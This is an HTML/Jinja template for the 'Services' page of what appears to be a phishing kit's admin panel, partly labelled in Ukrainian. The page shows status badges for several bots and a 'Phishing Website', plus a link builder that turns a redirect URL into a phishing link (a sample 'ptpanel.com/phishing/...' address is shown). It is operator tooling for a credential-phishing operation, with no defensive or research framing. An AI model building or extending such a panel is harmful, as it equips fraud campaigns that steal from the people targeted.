{% extends "admin/base.html" %}

{% block title %}Services - {{ app_name }}{% endblock %}

{% block content %}
<div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
    <h1 class="h2">Services</h1>
</div>

<div class="row">
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5>Статус сервісів</h5>
            </div>
            <div class="card-body">
                <div class="mb-3">
                    <span class="badge bg-success">Online</span>
                    WebApp Bot
                </div>
                <div class="mb-3">
                    <span class="badge bg-success">Online</span>
                    Classic Bot
                </div>
                <div class="mb-3">
                    <span class="badge bg-success">Online</span>
                    Multitool Bot
                </div>
                <div class="mb-3">
                    <span class="badge bg-success">Online</span>
                    Admin Bot
                </div>
                <div class="mb-3">
                    <span class="badge bg-success">Online</span>
                    Phishing Website
                </div>
            </div>
        </div>
    </div>
    
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5>Білдер посилань</h5>
            </div>
            <div class="card-body">
                <div class="mb-3">
                    <label class="form-label">URL для редиректу:</label>
                    <input type="text" class="form-control" placeholder="https://example.com">
                </div>
                <button class="btn btn-primary w-100">
                    <i class="fas fa-link"></i> Згенерувати посилання
                </button>
                
                <div class="mt-3">
                    <label class="form-label">Ваше посилання:</label>
                    <div class="input-group">
                        <input type="text" class="form-control" value="https://ptpanel.com/phishing/abc123" readonly>
                        <button class="btn btn-outline-secondary" type="button">Copy</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}
